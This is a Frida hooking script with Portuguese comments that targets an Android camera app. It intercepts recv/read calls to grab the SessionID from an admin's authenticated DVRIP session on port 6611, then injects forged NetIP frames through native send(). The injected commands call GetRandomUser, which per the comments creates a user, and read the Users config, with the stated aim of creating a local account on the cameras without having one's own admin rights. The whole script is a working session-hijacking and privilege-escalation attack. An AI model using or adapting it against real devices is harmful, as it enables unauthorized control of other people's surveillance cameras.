/*
 * zz-inject.js — injeta comandos DVRIP na sessão :6611 AUTENTICADA (admin) do
 * app, pra criar um usuário local em f5332/9a07 sem precisar de admin próprio.
 *
 * Detecta a resposta de login (msg 1001, Ret 100) em recv(), pega fd+SessionID,
 * e injeta via send() nativo os comandos em CMDS[]. Respostas -> files/inject.txt.
 *
 * FASE 1 (atual): só LÊ a config Users/Group (pra ver o formato). Nada é alterado.
 */
(function () {
  var PKG = "com.cz.czeye", OUT = "/data/data/" + PKG + "/files/inject.txt";
  function save(l){ console.log("[inject] "+l.substring(0,160)); try{var f=new File(OUT,"a");f.write(l+"\n");f.flush();f.close();}catch(e){} }
  save("LOADING inject...");
  var done = {};   // fd -> já injetou
  var sendFn = null;
  try {
    var sp = Module.findExportByName("libc.so", "send") || Module.findExportByName(null, "send");
    if (sp) sendFn = new NativeFunction(sp, "int", ["int", "pointer", "size_t", "int"]);
    save("send=" + sp);
  } catch (e) { save("ERRO send: " + e); }

  // monta frame NetIP: FF 01 00 00 | SID(LE4) | seq(LE4) | chn 00 | msgid(LE2) | len(LE4) | json \0
  function frame(json, sid, msgid, seq) {
    var body = [];
    for (var i = 0; i < json.length; i++) body.push(json.charCodeAt(i) & 0xff);
    body.push(0);
    var n = body.length;
    var h = [0xFF,0x01,0,0, sid&0xff,(sid>>8)&0xff,(sid>>16)&0xff,(sid>>24)&0xff,
             seq&0xff,(seq>>8)&0xff,(seq>>16)&0xff,(seq>>24)&0xff, 0,0,
             msgid&0xff,(msgid>>8)&0xff, n&0xff,(n>>8)&0xff,(n>>16)&0xff,(n>>24)&0xff];
    var all = h.concat(body);
    var buf = Memory.alloc(all.length);
    buf.writeByteArray(all);
    return { ptr: buf, len: all.length };
  }

  function inject(fd, sidHex, sidNum) {
    // FASE 1b: GetRandomUser (cria usuário) + ler Users (ver se admin lê).
    var CMDS = [
      ['{"Name":"GetRandomUser","SessionID":"' + sidHex + '"}', 1660],
      ['{"Name":"Users","SessionID":"' + sidHex + '"}', 1042],
    ];
    if (!sendFn) { save("sem sendFn, nao injeta"); return; }
    var seq = 500;
    CMDS.forEach(function (c) {
      try { var f = frame(c[0], sidNum, c[1], seq++);
        var r = sendFn(fd, f.ptr, f.len, 0);
        save("INJETADO fd=" + fd + " msg=" + c[1] + " ret=" + r + "  " + c[0].substring(0, 60));
      } catch (e) { save("ERRO inject: " + e); }
    });
  }

  function scan(buf, n) {
    try {
      var b = buf.readByteArray(n); if (!b) return null;
      var u = new Uint8Array(b), s = "";
      for (var i = 0; i < u.length; i++) s += String.fromCharCode(u[i]);
      return s;
    } catch (e) { return null; }
  }

  function onRead(fd, buf, n) {
    if (n <= 0 || n > 65536) return;
    var s = scan(buf, n); if (!s) return;
    // resposta de login admin: AliveInterval + SessionID
    if (s.indexOf("AliveInterval") >= 0 && s.indexOf("SessionID") >= 0 && !done[fd]) {
      var m = s.match(/"SessionID"\s*:\s*"?(0x[0-9a-fA-F]+)"?/);
      if (m) {
        done[fd] = 1;
        save("LOGIN admin detectado fd=" + fd + " SID=" + m[1]);
        inject(fd, m[1], parseInt(m[1], 16));
      }
    }
    // respostas às injeções: GetRandomUser(Info) ou Users/Ret
    if (/GetRandomUser|"Info"|"Name":"Users"/.test(s)) {
      save("RESP " + s.replace(/[^\x20-\x7e]/g, ".").substring(0, 1200));
    }
  }
  ["read", "recv", "recvfrom"].forEach(function (nm) {
    var p = Module.findExportByName("libc.so", nm) || Module.findExportByName(null, nm);
    if (!p) { save("sem " + nm); return; }
    try {
      Interceptor.attach(p, {
        onEnter: function (a) { this.fd = a[0].toInt32(); this.buf = a[1]; },
        onLeave: function (r) { onRead(this.fd, this.buf, r.toInt32()); }
      });
      save("hook IN " + nm);
    } catch (e) { save("ERRO hook " + nm + ": " + e); }
  });
  save("ARMED inject — abra f5332/9a07 no app");
})();
